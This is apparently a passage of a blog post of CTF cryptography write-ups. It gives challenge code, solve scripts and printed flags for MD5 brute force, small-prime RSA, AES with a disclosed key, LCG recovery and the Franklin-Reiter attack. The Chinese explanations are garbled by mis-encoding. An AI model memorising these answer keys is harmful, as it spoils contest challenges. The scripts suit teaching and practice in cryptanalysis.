<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># data=&#x27;Boom_MD5****&#x27;</span></span><br><span class="line"><span class="comment"># flag=MD5(data)</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment">#0618ac93d4631df725bceea74d0*****</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_encrypt</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åˆ›å»º MD5 åŠ å¯†å¯¹è±¡</span></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        <span class="comment"># å°†è¾“å…¥å­—ç¬¦ä¸²ç¼–ç ä¸ºå­—èŠ‚</span></span><br><span class="line">        input_bytes = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># æ›´æ–° MD5 å¯¹è±¡</span></span><br><span class="line">        md5.update(input_bytes)</span><br><span class="line">        <span class="comment"># è·å– MD5 åŠ å¯†ç»“æœ</span></span><br><span class="line">        encrypted_string = md5.hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encrypted_string</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;åŠ å¯†å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">additional_chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">128</span>)])</span><br><span class="line"></span><br><span class="line">all_letters_and_digits = string.ascii_letters + string.digits + additional_chars</span><br><span class="line"><span class="comment"># string.ascii_uppercase å¤§å†™å­—æ¯</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">                <span class="built_in">str</span> = <span class="string">&quot;Boom_MD5&quot;</span> + i + j + k + m</span><br><span class="line">                md5str = md5_encrypt(<span class="built_in">str</span>).lower()</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>,md5str)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;0618ac93d4631df725bceea74d0&quot;</span> <span class="keyword">in</span> md5str:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">                    <span class="built_in">print</span>(md5str)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-yafuåˆ†è§£"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-yafuåˆ†è§£" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]yafuåˆ†è§£"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]yafuåˆ†è§£</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">140</span>)</span><br><span class="line">q = getPrime(<span class="number">140</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="comment">#n=1851012829537540993346897265450988006921329733937556249710137670254755668838970157221</span></span><br><span class="line"><span class="comment">#c=1165608868963663237838494928147497339359377331987999335624507621030816298293537918937</span></span><br></pre></td></tr></table></figure>

<p>p qä¸æ˜¯å¾ˆå¤§ yafuå»åˆ†è§£ç´ æ•°</p>
<p>C:\Users\test\Desktop\yafu-1.34&gt;yafu-Win32.exe â€œfactor(1851012829537540993346897265450988006921329733937556249710137670254755668838970157221)â€</p>
<p>åˆ†è§£å¾—åˆ°</p>
<p>P43 = 1362310363870711901033415700690289289304517</p>
<p>P43 = 1358730637766188714476624560503309609820513</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">1362310363870711901033415700690289289304517</span></span><br><span class="line">q = <span class="number">1358730637766188714476624560503309609820513</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1851012829537540993346897265450988006921329733937556249710137670254755668838970157221</span></span><br><span class="line">c = <span class="number">1165608868963663237838494928147497339359377331987999335624507621030816298293537918937</span></span><br><span class="line"></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;AFFPGS&#123;snzv1l_ov9_gur_g0_Jr1p0zr&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå‡¯æ’’è§£å¯†  NSSCTF{fami1y_bi9_the_t0_We1c0me}</p>
<p><img src="/posts/bb5a57d9/6.png"></p>
<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-AES"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-AES" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]AES"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]AES</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line">iv = <span class="string">&#x27;1229002635654321&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;nssctfneedcrypto&#x27;</span></span><br><span class="line">data = getflag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½æ•°ä¸è¶³åå…­ä½ç”¨ç©ºæ ¼å¡«å……</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_data = data</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data)):</span><br><span class="line">        pad_data = pad_data + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_en</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">16</span>:</span><br><span class="line">        data = pad(data)</span><br><span class="line">    AES_obj = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = AES_obj.encrypt(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = base64.b64encode(AES_en_str)</span><br><span class="line">    AES_en_str = AES_en_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> AES_en_str</span><br><span class="line"></span><br><span class="line">data = AES_en(key, data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#data=862EoKZMO3sqpNlzyvIW5G/8MFeAI/zgGXcgi5eNOL8=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½æ•°ä¸è¶³åå…­ä½ç”¨ç©ºæ ¼å¡«å……</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_data = data</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data)):</span><br><span class="line">        pad_data = pad_data + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_en</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">16</span>:</span><br><span class="line">        data = pad(data)</span><br><span class="line">    AES_obj = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="comment"># AESå è¿›è¡Œutf8åŠ å¯† base64ç¼–ç  utf8è§£å¯†</span></span><br><span class="line">    AES_en_str = AES_obj.encrypt(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = base64.b64encode(AES_en_str)</span><br><span class="line">    AES_en_str = AES_en_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> AES_en_str</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&#x27;1229002635654321&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;nssctfneedcrypto&#x27;</span></span><br><span class="line">data= <span class="string">&quot;862EoKZMO3sqpNlzyvIW5G/8MFeAI/zgGXcgi5eNOL8=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_de</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line">    data = cipher.decrypt(data)</span><br><span class="line">    data = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">AES_de(key,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;NSS_CRYPTO_NEED_YOU_0000&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-æ–°ç”Ÿèµ›-EasyRSA"><a href="#SWPUCTF-2023-æ–°ç”Ÿèµ›-EasyRSA" class="headerlink" title="[SWPUCTF 2023 æ–°ç”Ÿèµ›]EasyRSA"></a>[SWPUCTF 2023 æ–°ç”Ÿèµ›]EasyRSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">  </span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)  </span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)  </span><br><span class="line">e=<span class="number">65537</span>  </span><br><span class="line">m=<span class="string">&quot;NSSCTF&#123;*******************&#125;&quot;</span>  </span><br><span class="line">m=libnum.s2n(m)  </span><br><span class="line">n=p*q  </span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">d=libnum.invmod(e,phi_n)  </span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)    </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;e=&quot;</span>,e)  </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p= 122912801126049869009003839542545176400185213365268209105714006257803073428638629824801261702125287814910668428403367391355051987389837804474055637991864563803834741161217607848968821280710324766558457056004037592628178078680121173634128054936108782807954132605887275556228703383455969903056759874047110115433</span></span><br><span class="line"><span class="comment">#q= 120790113700754477830062212762518406876786376726996249661848284428829412089402183812692045970711341815805796005449714738748110749559462448861357011272792817313060401380148108517705435100103533857957024851181447994572972501120774586405811257420853542417275740953525627232008812587423053626515513859653865873671</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br><span class="line"><span class="comment">#c= 7094224488947659163318199615533819770556597977720767621640224798887506152292861133457571683713587909779712343346370719403811813233693263526316785431883833118583425528830238629831001255198236686372518770451273159769779374149881346761523688131115323441973953523582174059584087249568245044443295176738493785560215046375056269378223045128094953923926250055718405799885041115025529297362914403732661935017257507786348635366480744933193471899621592092711962814949533564454932121056035003021428158830645604347966849572981124877683317022116903132719663958775850982016292384237647664448371811915879714093710876989697939277005</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p= <span class="number">122912801126049869009003839542545176400185213365268209105714006257803073428638629824801261702125287814910668428403367391355051987389837804474055637991864563803834741161217607848968821280710324766558457056004037592628178078680121173634128054936108782807954132605887275556228703383455969903056759874047110115433</span></span><br><span class="line">q= <span class="number">120790113700754477830062212762518406876786376726996249661848284428829412089402183812692045970711341815805796005449714738748110749559462448861357011272792817313060401380148108517705435100103533857957024851181447994572972501120774586405811257420853542417275740953525627232008812587423053626515513859653865873671</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">c= <span class="number">7094224488947659163318199615533819770556597977720767621640224798887506152292861133457571683713587909779712343346370719403811813233693263526316785431883833118583425528830238629831001255198236686372518770451273159769779374149881346761523688131115323441973953523582174059584087249568245044443295176738493785560215046375056269378223045128094953923926250055718405799885041115025529297362914403732661935017257507786348635366480744933193471899621592092711962814949533564454932121056035003021428158830645604347966849572981124877683317022116903132719663958775850982016292384237647664448371811915879714093710876989697939277005</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;RSA_1s_so_ea3y_and_interest1ng!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="NSSRound-4-SWPU-ezcrypto-LCG"><a href="#NSSRound-4-SWPU-ezcrypto-LCG" class="headerlink" title="[NSSRound#4 SWPU]ezcrypto LCG"></a>[NSSRound#4 SWPU]ezcrypto LCG</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Symbol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.alpha = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.beta = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.n = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.alpha * self.seed + self.beta) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;alpha = &#123;&#125;\nbeta = &#123;&#125;\nn = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.alpha, self.beta, self.n))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;res1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;res2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line">symbol = Symbol()</span><br><span class="line">symbol.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (symbol.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"></span><br><span class="line">alpha = <span class="number">2659869614</span></span><br><span class="line">beta = <span class="number">3138014669</span></span><br><span class="line">n = <span class="number">2171187379</span></span><br><span class="line">res1 = <span class="number">32421</span></span><br><span class="line">res2 = <span class="number">32382</span></span><br><span class="line"><span class="number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span></span><br></pre></td></tr></table></figure>

<p>alpha beta seed 32ä½éšæœºæ•´æ•°</p>
<p>n 32ä½ç´ æ•°</p>
<p>seed =(a * seed + b ) mod n</p>
<p>å·²çŸ¥å‰ä¸¤ä¸ªè¿ç»­çš„reså€¼ res = seed &gt;&gt; 16</p>
<p>c[i] = flag[i] ^ ( ((a*seed+b)mod n )&gt;&gt;16 )%10</p>
<p>flag å‰å‡ ä½æ˜¯ NSSCTF ä¸ºé»˜è®¤å·²çŸ¥æ¡ä»¶</p>
<p>X0 = c[0]^N</p>
<p>seed =(a * seed + b ) mod n</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">alpha = <span class="number">2659869614</span></span><br><span class="line">beta = <span class="number">3138014669</span></span><br><span class="line">n = <span class="number">2171187379</span></span><br><span class="line">res1 = <span class="number">32421</span></span><br><span class="line">res2 = <span class="number">32382</span></span><br><span class="line">c = <span class="number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span></span><br><span class="line">c = long_to_bytes(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(c[0]^ord(&#x27;N&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éœ€è¦è½¬æˆäºŒè¿›åˆ¶åœ¨å·¦ç§» åè¿›åˆ¶ä¸è¡Œ</span></span><br><span class="line"><span class="comment"># for i in range(32421,32421&lt;&lt;16):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0b111111010100101</span> &lt;&lt; <span class="number">16</span>, (<span class="number">0b111111010100101</span> &lt;&lt; <span class="number">16</span>) + <span class="number">2</span> ** <span class="number">16</span>)):</span><br><span class="line"></span><br><span class="line">    x = (alpha*i + beta)%n</span><br><span class="line">    <span class="keyword">if</span> x &gt;&gt; <span class="number">16</span> == res2:</span><br><span class="line">        y = (alpha*x + beta)%n</span><br><span class="line">        <span class="keyword">if</span> (y &gt;&gt; <span class="number">16</span> )%<span class="number">10</span> == c[<span class="number">0</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(i,x)</span><br><span class="line">			<span class="comment"># 2124788500 2122226329</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">res1=<span class="number">2124788500</span></span><br><span class="line">res2=<span class="number">2122226329</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    x = (a*b+c)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c :</span><br><span class="line">    res2 = lcg(res2,alpha,beta)</span><br><span class="line">    <span class="built_in">print</span>(  <span class="built_in">chr</span>(((res2&gt;&gt;<span class="number">16</span>)%<span class="number">10</span>)^i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-å°æ˜æ–‡ï¼Ÿ"><a href="#SWPUCTF-2023-ç§‹å­£æ–°ç”Ÿèµ›-å°æ˜æ–‡ï¼Ÿ" class="headerlink" title="[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]å°æ˜æ–‡ï¼Ÿ"></a>[SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]å°æ˜æ–‡ï¼Ÿ</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">m1=flag = <span class="string">b&#x27;NSSCTF&#123;*******&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m1</span>):</span><br><span class="line">    p = getPrime(<span class="number">700</span>)</span><br><span class="line">    q = getPrime(<span class="number">700</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    a = getPrime(<span class="number">128</span>)</span><br><span class="line">    b = getPrime(<span class="number">128</span>)</span><br><span class="line">    m1 = bytes_to_long(m1)</span><br><span class="line">    mm1 = a * m1 + b</span><br><span class="line"></span><br><span class="line">    c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    c2 = <span class="built_in">pow</span>(mm1, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 13026126941826887019162872735099540876106694302074884925200107036130428843197729140372377590706535217469477301361486550282890330093772372813532795303163348233096919179478061917423707929667355386062657434467799360617526194768968700908096844475960205671302377364202483195391706116078632202015938962280529309403244885363904094804118278167720593581764017089021116316636464533785051436622916960956665030100255641288863474938703</span></span><br><span class="line"><span class="comment"># a = 280807370135687531454416708417179457159</span></span><br><span class="line"><span class="comment"># b = 210598260561987226227971066630761929397</span></span><br><span class="line"><span class="comment"># c1 = 5484670538103757119990644460454986219076673914082966464351809153114702100411054106785392646801736865489738145857425179185164710603704198643749378051371008266521829572436350080663825339915763509501690398283916091505443322384568973565599179112299853287766734493187659418383619877040013434926843623979979122417950089001830664273269598688130410251828579862218274297572192961909808728768317567218412746711665911495028223620671</span></span><br><span class="line"><span class="comment"># c2 = 249587944874112168607313602465869274336587750392364868939732783502223999305089384749508572630699199927194600499968110646290832205640569694933539973256281796631433129626712361622584048439446364992886884217198680921278383770604919381329363647924261642857483728973331091285820401689502291336332199019252649615680893389557508558362194551939434128389351824194393680744241807605416750291337127085044177563509645273228457253193</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Related Message Attackï¼š</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<p>å¦‚æœä¸¤ä¸ªä¿¡æ¯ä¹‹é—´M1 M2åªå­˜åœ¨å·²çŸ¥çš„å›ºå®šå·®å¼‚ã€çº¿æ€§å…³ç³»ã€‘ï¼Œå¹¶ä¸”ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•°Nä¸‹è¿›è¡ŒRSAåŠ å¯†</p>
<p>å…·ä½“åŸç†ä¸çœ‹äº†ã€è¯¦ç»†å¯çœ‹è¿™é‡Œ<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack%E3%80%91">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attackã€‘</a></p>
<p><img src="/posts/bb5a57d9/7.png"></p>
<p>æœ€ç»ˆå¯æ¨å‡ºå¦‚ä¸‹å¼å­</p>
<p><img src="/posts/bb5a57d9/8.png"></p>
<p>é¢˜ç›®å·²çŸ¥æ¡ä»¶ c1 c2 a bï¼ŒM2=aM1+b çº¿æ€§å…³ç³»ï¼Œæ‰€ä»¥å¯ä»¥æ±‚å‡ºM2</p>
<p>ç›´æ¥å¥—è½®å­[sageçœ‹ä¸æ‡‚ ç›´æ¥æ‹¿è¿‡æ¥äº†]</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">13026126941826887019162872735099540876106694302074884925200107036130428843197729140372377590706535217469477301361486550282890330093772372813532795303163348233096919179478061917423707929667355386062657434467799360617526194768968700908096844475960205671302377364202483195391706116078632202015938962280529309403244885363904094804118278167720593581764017089021116316636464533785051436622916960956665030100255641288863474938703</span></span><br><span class="line">a = <span class="number">280807370135687531454416708417179457159</span></span><br><span class="line">b = <span class="number">210598260561987226227971066630761929397</span></span><br><span class="line">c1 = <span class="number">5484670538103757119990644460454986219076673914082966464351809153114702100411054106785392646801736865489738145857425179185164710603704198643749378051371008266521829572436350080663825339915763509501690398283916091505443322384568973565599179112299853287766734493187659418383619877040013434926843623979979122417950089001830664273269598688130410251828579862218274297572192961909808728768317567218412746711665911495028223620671</span></span><br><span class="line">c2 = <span class="number">249587944874112168607313602465869274336587750392364868939732783502223999305089384749508572630699199927194600499968110646290832205640569694933539973256281796631433129626712361622584048439446364992886884217198680921278383770604919381329363647924261642857483728973331091285820401689502291336332199019252649615680893389557508558362194551939434128389351824194393680744241807605416750291337127085044177563509645273228457253193</span></span><br><span class="line">e=<span class="number">5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic() <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;89c507f3-4a21-11ee-a71e-c03c59457d4d&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/posts/bb5a57d9/9.png"></p>
